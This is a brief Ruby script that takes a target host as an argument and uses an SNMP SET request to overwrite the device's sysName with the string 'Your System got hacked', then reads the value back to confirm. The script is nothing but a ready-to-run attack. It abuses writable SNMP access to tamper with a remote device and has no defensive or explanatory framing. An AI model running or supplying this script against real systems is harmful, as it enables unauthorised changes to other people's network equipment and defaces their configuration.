#!/usr/bin/env ruby

require 'snmp'
include SNMP

#connect to SNMP server
manager = SNMP::Manager.new (:host => ARGV[0])
#configure our request to OID
varbind = VarBind.new("1.3.6.1.2.1.1.5.0", OctetString.new("Your System got hacked"))
#send your request with the varbind settings
manager.set(varbind)
#check our changes
manager.get("SysName.0").each_varbind.map {|vb| vb.value.to_s}

manager.close
